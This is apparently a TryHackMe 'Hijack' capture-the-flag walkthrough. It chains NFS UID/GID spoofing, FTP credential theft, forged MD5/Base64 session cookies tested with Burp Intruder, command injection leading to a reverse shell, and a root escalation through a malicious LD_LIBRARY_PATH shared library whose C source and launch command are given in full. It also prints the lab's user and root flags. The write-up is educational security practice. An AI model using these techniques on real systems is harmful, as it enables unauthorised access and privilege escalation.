# 🔐 TryHackMe — Hijack

> **NFS Enumeration | UID/GID Manipulation | FTP Enumeration | Credential Discovery | MD5 | Base64 | Session Hijacking | Command Injection | Reverse Shell | SSH | LD_LIBRARY_PATH Hijacking | Linux Privilege Escalation**

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555)
![Difficulty](https://img.shields.io/badge/Platform-TryHackMe-00a98f?style=flat-square&labelColor=555555)
![Difficulty](https://img.shields.io/badge/OS-Ubuntu-e95420?style=flat-square&labelColor=555555)
![Difficulty](https://img.shields.io/badge/Web-Apache%202.4.18-d22128?style=flat-square&labelColor=555555)
![Difficulty](https://img.shields.io/badge/NFS-Enabled-577590?style=flat-square&labelColor=555555)
![Difficulty](https://img.shields.io/badge/Tools-Nmap%20%7C%20Burp%20%7C%20FTP-6f42c1?style=flat-square&labelColor=555555)

---

# 📌 Overview

**Hijack** is a TryHackMe Linux penetration-testing lab involving multiple vulnerabilities chained together to obtain administrator access and eventually a root shell.

The attack chain starts with network enumeration and an exposed NFS share, which leads to FTP credentials. The FTP server then exposes a password list that can be used to recreate the application's session cookie.

After obtaining an administrative session, the web application's service-status functionality is vulnerable to command injection. This provides a reverse shell and exposes application configuration containing credentials for the `rick` user.

Finally, Apache's dynamic library loading mechanism is abused through `LD_LIBRARY_PATH` to execute a malicious shared library and obtain a root shell.

---

# 🎯 Objectives

The main objectives of this lab were:

- Enumerate the target machine.
- Identify exposed network services.
- Enumerate NFS exports.
- Mount the NFS share.
- Understand UID/GID-based NFS permissions.
- Obtain FTP credentials.
- Enumerate the FTP server.
- Download sensitive files.
- Analyze the application's password/session mechanism.
- Generate candidate session cookies.
- Use Burp Suite Intruder to identify a valid administrative session.
- Exploit command injection.
- Obtain a reverse shell.
- Discover credentials from `config.php`.
- SSH into the target as `rick`.
- Enumerate Apache's shared libraries.
- Abuse `LD_LIBRARY_PATH`.
- Execute a malicious shared library.
- Obtain root access.
- Retrieve the user and root flags.


---

# 🗺️ Attack Chain
```
                    ┌─────────────────────┐
                    │     Target Host     │
                    └──────────┬──────────┘
                               │
                               ▼
                         Nmap Enumeration
                               │
                               ▼
                         NFS Enumeration
                               │
                               ▼
                         /mnt/share
                               │
                               ▼
                         UID/GID Match
                               │
                               ▼
                     FTP Credentials
                               │
                               ▼
                          FTP Login
                               │
                               ▼
                 .from_admin.txt
                 .passwords_list.txt
                               │
                               ▼
                      MD5 + Base64
                               │
                               ▼
                     Cookie Generation
                               │
                               ▼
                       Burp Intruder
                               │
                               ▼
                    Administration Panel
                               │
                               ▼
                     Command Injection
                               │
                               ▼
                       Reverse Shell
                               │
                               ▼
                         config.php
                               │
                               ▼
                          rick User
                               │
                               ▼
                            SSH
                               │
                               ▼
                       Apache Enumeration
                               │
                               ▼
                       LD_LIBRARY_PATH
                               │
                               ▼
                    Malicious Shared Library
                               │
                               ▼
                         Root Shell
```

---

# 1. 🌐 Initial Web Enumeration

I first visited the target web server:
```
http://10.49.180.214
```
The homepage displayed:
```
Home
Administration
Login
Sign up

Welcome Guest

This site is still under development!
```
The website exposed several interesting endpoints:
```
Home
Administration
Login
Sign up
```
However, the homepage itself did not immediately reveal a clear attack path, so I moved to network enumeration.

<img width="729" height="313" alt="1" src="https://github.com/user-attachments/assets/6536a93b-4561-4ebc-b8e2-2b6876061f23" />

---

# 2. 🔎 Nmap Enumeration

I performed service and version detection:
```
nmap -sC -sV 10.49.180.214
```
The scan revealed:
```
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.2p2 Ubuntu
80/tcp   open  http     Apache httpd 2.4.18
111/tcp  open  rpcbind
2049/tcp open  nfs
```

The combination of:
```
111/tcp → rpcbind
2049/tcp → NFS
```
made NFS enumeration the next logical step.

<img width="780" height="723" alt="2" src="https://github.com/user-attachments/assets/b5a91040-da90-4d1e-aedb-5addb449c392" />

---

# 3. 📂 Enumerating NFS

I used showmount to enumerate the available NFS exports:
```
showmount -e 10.49.180.214
```
The server returned:
```
Export list for 10.49.180.214:
/mnt/share *
```
This revealed an exported directory:
```
/mnt/share
```
The * indicated that the export was not restricted to a specific client IP.

---

# 4. 📁 Creating the Mount Point

I first attempted to create a mount directory:
```
mkdir /mnt/1
```
This resulted in:
```
mkdir: cannot create directory '/mnt/1': Permission denied
```
Since /mnt required elevated privileges, I created the directory using:
```
sudo mkdir /mnt/1
```
Then verified it:
```
cd /mnt
ls -la
```

The directory 1 was present.

<img width="597" height="492" alt="3" src="https://github.com/user-attachments/assets/dfeac91d-fecb-4989-a01c-76b4e257fff5" />

---

# 5. 🗄️ Mounting the NFS Share

I mounted the exported share:
```
sudo mount -t nfs 10.49.180.214:/mnt/share /mnt/1
```

<img width="469" height="79" alt="4" src="https://github.com/user-attachments/assets/8a685e57-563d-4783-ad56-03abccf510f8" />

I then inspected /mnt:
```
ls -la
```
The mounted directory showed ownership associated with numeric UID/GID values:
```
drwxr-xr-x 2 1003 1003 ... 1
```
When I attempted to access it as the normal Kali user:
```
cd 1
```
I received:
```
cd: permission denied: 1
```
This indicated that the NFS share's filesystem permissions were based on UID/GID.

<img width="473" height="204" alt="4-1" src="https://github.com/user-attachments/assets/270c5f64-5053-4a93-905e-9e1f0c533b5f" />

---

# 6. 🧩 UID/GID Manipulation

The NFS directory was owned by:
```
UID = 1003
GID = 1003
```
NFS can rely on numeric UID/GID values when determining ownership.

Therefore, I created a local user and modified its UID/GID to match the values used by the mounted share.

I created the user:
```
sudo useradd fakeuser
```
I then modified the UID:
```
sudo usermod -u 1003 fakeuser
```
and the group:
```
sudo groupmod -g 1003 fakeuser
```
Why this works

The important part is not the username.

The important values are:
```
NFS Owner
   │
   ├── UID 1003
   └── GID 1003
          │
          ▼
Local fakeuser
   ├── UID 1003
   └── GID 1003
```
Matching the numeric identity allowed the local account to access the NFS files.

<img width="381" height="164" alt="4-2" src="https://github.com/user-attachments/assets/65e2f987-2774-4842-9026-7bb1625f75e7" />

---

# 7. 👤 Accessing the NFS Share

I switched to the new user:
```
sudo su fakeuser
```
Then:
```
cd 1
ls
```
The directory contained:
```
for_employees.txt
```
I read the file:
```
cat for_employees.txt
```
The file contained FTP credentials.

The important information was:

<img width="391" height="197" alt="5" src="https://github.com/user-attachments/assets/b073c03a-ee00-443c-98c3-5674d8392a19" />

This provided the credentials needed to investigate the FTP service discovered during the initial Nmap scan.

---

# 8. 📡 FTP Login

Nmap had previously identified:
```
21/tcp open ftp vsftpd 3.0.3
```
I connected to the FTP service:
```
ftp 10.49.180.214
```
I entered the username and password obtained from the NFS share.

The server returned:
```
230 Login successful.
```

<img width="631" height="400" alt="6" src="https://github.com/user-attachments/assets/5561d40d-87c8-4eac-95eb-b6a6b8293b01" />

---

# 9. 📂 FTP Enumeration

After authentication, I listed the directory:
```
ls
```
I then performed a detailed listing:
```
ls -la
```
The FTP directory contained:
```
.bash_logout
.bashrc
.from_admin.txt
.passwords_list.txt
.profile
```
Two files were particularly interesting:
```
.from_admin.txt
.passwords_list.txt
```

---

# 10. ⬇️ Downloading the Files

I downloaded both files:
```
get .from_admin.txt
get .passwords_list.txt
```
The transfers completed successfully.

I then returned to my Kali terminal and confirmed the files existed locally.

<img width="1242" height="237" alt="7" src="https://github.com/user-attachments/assets/b980beea-f388-4a43-9f4c-c1603ed8cb12" />

<img width="528" height="147" alt="8-1" src="https://github.com/user-attachments/assets/a9a9b843-77ac-4b04-922a-2fd7e566c4b5" />

---

# 11. 📜 Reading .from_admin.txt

I opened the administrator message:
```
cat .from_admin.txt
```
The message indicated that a safe list of passwords had been prepared for employees.

It also mentioned that login attempts had been limited to prevent brute-force attacks.

This was an important clue.

A traditional brute-force attack would likely be ineffective because of the login-attempt restrictions.

The second file therefore became more interesting.

<img width="1233" height="299" alt="8-2" src="https://github.com/user-attachments/assets/56d8fb39-7175-43ad-9b2b-53a1364dd21e" />

---

# 12. 🔑 Examining .passwords_list.txt

I inspected the password list:
```
cat .passwords_list.txt
```
The file contained numerous password candidates:
```
Vxb38mSNNBwxqHxv6umx
56J4Zw6cvz8qDvhCwCV
qLnqTxydny3ktstntLGu
N63nPUxDG2ZvrZh9P978
jw3Ezr26tygTdgBZVYGr
...
```
Rather than directly brute-forcing the login form, I investigated how the application generated its authentication/session cookie.

---

# 13. 🍪 Inspecting the PHP Session Cookie

Using Burp Suite, I intercepted a request to the application.

The request contained:
```
GET /index.php HTTP/1.1
Host: 10.49.180.214
Cookie: PHPSESSID=...
```
The cookie value was inspected using Burp's Inspector.

The value could be transformed through:
```
URL Encoding
     ↓
Base64
     ↓
admin:<hash>
```
This revealed that the session value was not simply a random PHP session identifier.

There was a predictable structure behind the value.

<img width="1233" height="347" alt="9" src="https://github.com/user-attachments/assets/59388762-42b0-455e-9f98-272eb63bbc72" />

---

# 14. 🔓 Identifying the MD5 Hash

The decoded value contained an MD5 hash:
```
6ad14ba9986e3615423dfca256d04e3f
```
I tested the hash against a password-hash cracking service.

The result was:
```
user123
```
This confirmed that the application was using MD5 as part of its authentication/session construction.

<img width="1072" height="418" alt="9-2" src="https://github.com/user-attachments/assets/e70dcf52-f340-4c6b-bdbf-5b5d8cfc7ee8" />

---

# 5. 🐍 Creating a Cookie Generator

I created a Python script to reproduce the application's cookie-generation process.

The script imports:
```
import hashlib
import base64
```
The MD5 function was:
```
def md5_hash_password(password):
    md5 = hashlib.md5()
    md5.update(password.encode('utf-8'))
    return md5.hexdigest()
```
The password was then transformed into:
```
admin:<md5_hash>
```
and finally Base64 encoded.
```
The process was:

Password
   ↓
MD5
   ↓
admin:<hash>
   ↓
Base64
   ↓
PHPSESSID candidate
```
The conversion script used in the lab performs exactly this process.

---

# 16. ⚙️ Generating Candidate Cookies

The password list was stored as:
```
passwords.txt
```
I ran the conversion script:
```
python3 convert.py
```
The script generated:
```
cookies.txt
```
I then inspected the generated values:
```
cat cookies.txt
```
The file contained Base64-encoded session candidates.

Each candidate represented:
```
Base64(
    admin:<MD5(password)>
)
```

<img width="813" height="345" alt="10" src="https://github.com/user-attachments/assets/4f5b62ce-3098-4ecf-8c31-17cfd6a36284" />

---

# 17. 💥 Burp Suite Intruder

I intercepted a request to:
```
/administration.php
```
The request contained:
```
Cookie: PHPSESSID=<value>
```
I sent the request to Burp Suite Intruder and marked the PHPSESSID value as the payload position.

I then loaded the values from:
```
cookies.txt
```
Burp showed:
```
Payload count: 150
Request count: 150
```
<img width="1160" height="366" alt="11" src="https://github.com/user-attachments/assets/1975fe54-370d-4438-95f1-227cd95f1223" />

---

# 18. 🔎 Identifying the Valid Session

After launching the Intruder attack, I compared the responses.

Most requests returned responses around:
```
Length: 365
```
One request was noticeably different:
```
Request: 82
Status: 200
Length: 1202
```
The different response indicated that the corresponding cookie was accepted differently by the application.

The response contained:
```
<title>
    Administration Page
</title>
```
This confirmed that a valid administrative session had been obtained.
<img width="1226" height="543" alt="12" src="https://github.com/user-attachments/assets/0c06c0b9-74fd-436f-967e-401f848028a3" />

---

# 19. 🍪 Confirming the Administrative Cookie

I inspected the browser's cookie storage.

The application had created a:
```
PHPSESSID
```
cookie for the target domain.

The cookie properties shown in the browser included:
```
HttpOnly: true
Secure: false
SameSite: None
Path: /
```
The valid session allowed access to the administration functionality.

<img width="805" height="280" alt="13-1" src="https://github.com/user-attachments/assets/a9035275-aae7-43f5-87a5-fc71703c9e68" />

---

# 20. 🛠️ Accessing the Administration Panel

The authenticated page displayed:
```
Administration Panel
```
The page contained:
```
Services Status Checker
```
with an input field:
```
Provide the service name:
```
and an:
```
Execute
```
button.

This functionality was immediately interesting because it appeared to execute a command based on the supplied service name.

<img width="989" height="375" alt="13-2" src="https://github.com/user-attachments/assets/fea14d2e-723c-48a2-a5d9-81a1bb99d7ce" />

---

# 21. 💉 Testing for Command Injection

I tested the service-name parameter using command substitution:
```
$(id)
```
The application processed the shell expression and returned the output.

This confirmed that the input was being interpreted by a shell.

Command Injection Concept

A payload such as:
```
$(id)
```
causes the shell to execute:
```
id
```
and substitute the command's output into the surrounding command.

Therefore, the input field was not restricted to legitimate service names.

The application was vulnerable to OS command injection.

<img width="755" height="246" alt="14" src="https://github.com/user-attachments/assets/5da3c31b-e92f-451b-a383-58bf4d310928" />

---

# 22. 💻 Reverse Shell

After confirming command execution, I used command substitution to execute a reverse-shell command.

The callback was directed to my Kali machine:
```
192.168.132.194
```
on port:
```
4444
```
On Kali, I started a listener:
```
nc -lvnp 4444
```
The target connected back:
```
connect to [192.168.132.194] from (UNKNOWN) [10.49.134.204]
```
I verified access by listing the web application's files:
```
ls
```
The directory contained:
```
administration.php
config.php
index.php
login.php
logout.php
navbar.php
service_status.sh
signup.php
style.css
```
This confirmed command execution on the target server.

<img width="601" height="228" alt="15-1" src="https://github.com/user-attachments/assets/0a484c86-bfbb-41a4-b8aa-4e3b988d8bdd" />
<img width="611" height="260" alt="15-2" src="https://github.com/user-attachments/assets/3a638b16-5404-46a1-a383-06754ba97e52" />

---

# 23. 🔑 Reading config.php

One of the most interesting files was:
```
config.php

I read it:
```
cat config.php

The file contained the application's database configuration:
```
<?php

$servername = "localhost";
$username = "rick";
$password = "<REDACTED>";
$dbname = "hijack";

$mysqli = new mysqli(
    $servername,
    $username,
    $password,
    $dbname
);
?>
```
The important discovery was:
```
username = rick
```
along with the password stored in the application configuration.

The password is redacted from this public write-up.

This provided credentials for the rick account.

<img width="609" height="242" alt="16" src="https://github.com/user-attachments/assets/e5b2664e-cc1c-4384-b8c1-d7fa99812f33" />

---

# 24. 🔐 SSH as rick

Nmap had previously identified SSH:
```
22/tcp open ssh OpenSSH 7.2p2
```
Using the discovered credentials, I connected:
```
ssh rick@10.49.134.204
```
The login succeeded.

I now had a stable SSH shell as:
```
rick@10.49.134.204
```

<img width="841" height="607" alt="17" src="https://github.com/user-attachments/assets/0b1bfe43-77b0-4d16-8224-cd84e8e0ba6f" />

---

# 25. 🚩 User Flag

I listed the home directory:
```
ls
```
The directory contained:
```
user.txt
```
I read it:
```
cat user.txt
```
The flag was:
```
THM{fdc8dc4cff2c190d1022e78481ddf36}
```
The user-level objective was now complete.


<img width="318" height="44" alt="18" src="https://github.com/user-attachments/assets/4f199acc-9e6d-46bb-a656-959fefd7739c" />

---

# 26. 🔎 Apache Enumeration

The next objective was privilege escalation.

I investigated the Apache installation.

I executed:
```
/usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```
Apache returned configuration warnings:
```
AH00111: Config variable ${APACHE_PID_FILE} is not defined
AH00111: Config variable ${APACHE_RUN_USER} is not defined
AH00111: Config variable ${APACHE_RUN_GROUP} is not defined
AH00111: Config variable ${APACHE_LOG_DIR} is not defined
```
I then checked the libraries used by Apache:
```
ldd /usr/sbin/apache2
```
The output showed dynamically linked libraries such as:
```
libaprutil-1.so.0
libapr-1.so.0
libpthread.so.0
libc.so.6
libcrypt.so.1
libexpat.so.1
...
```

This suggested investigating Apache's dynamic library loading behavior.
<img width="951" height="354" alt="19" src="https://github.com/user-attachments/assets/f8787c11-2d7f-4e54-a399-7df29fe1dd27" />

---

# 27. 🧩 Understanding LD_LIBRARY_PATH

Linux dynamically linked programs search for shared libraries using several mechanisms.

One of them is:
```
LD_LIBRARY_PATH
```

If this environment variable points to an attacker-controlled directory, a vulnerable privileged process may load an attacker-controlled shared library.

The intended attack path was:
```
Apache
   ↓
LD_LIBRARY_PATH=/tmp
   ↓
Malicious shared library
   ↓
Library constructor
   ↓
setresuid(0,0,0)
   ↓
/bin/bash -p
   ↓
Root
```

---

# 28. 🧪 Creating hijack.c

I created a C source file:
```
hijack.c
```
The payload used a constructor:
```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack(){
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```
**Explanation**

The following:
```
__attribute__((constructor))
```
causes hijack() to execute automatically when the shared library is loaded.

Then:
```
unsetenv("LD_LIBRARY_PATH");
```
removes the modified library path from the environment.

Next:
```
setresuid(0,0,0);
```
sets the real, effective and saved user IDs to UID 0.

Finally:
```
system("/bin/bash -p");
```
starts a privileged Bash shell.

---

# 29. ⚙️ Compiling the Malicious Library

I compiled the source code as a shared library:
```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/rick/hijack.c
```
The important compiler options were:
```
-shared
```
which creates a shared object, and:
```
-fPIC
```
which generates position-independent code.

The malicious library was created as:
```
/tmp/libcrypt.so.1
```

<img width="1042" height="178" alt="20-1" src="https://github.com/user-attachments/assets/37797547-0d6d-4efa-8979-c918b626b7dc" />

---

# 30. 🚀 Exploiting ```LD_LIBRARY_PATH```

I launched Apache with ```/tmp``` added to its library search path:
```
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```
Apache loaded the malicious shared library.

Because the library contained a constructor function, the payload executed automatically.

The resulting shell was:
```
root@Hijack:~#
```
I verified the current identity:
```
id
```
The output confirmed:
```
uid=0(root) gid=0(root) groups=0(root)
```
This confirmed successful privilege escalation to root.

---

# 31. 👑 Root Shell

The shell was now running as:
```
root
```
I moved to the root directory:
```
cd /root
```
Then:
```
ls
```
The directory contained:
```
root.txt
```

---

# 32. 🚩 Root Flag

I read the final flag:
```
cat root.txt
```
The result was:
```
THM{b91ea3e8285157eaf173d88d0a73ed5a}
```
<img width="537" height="233" alt="20-3" src="https://github.com/user-attachments/assets/5413511d-4b38-4f6b-8a34-99602f02fc6e" />
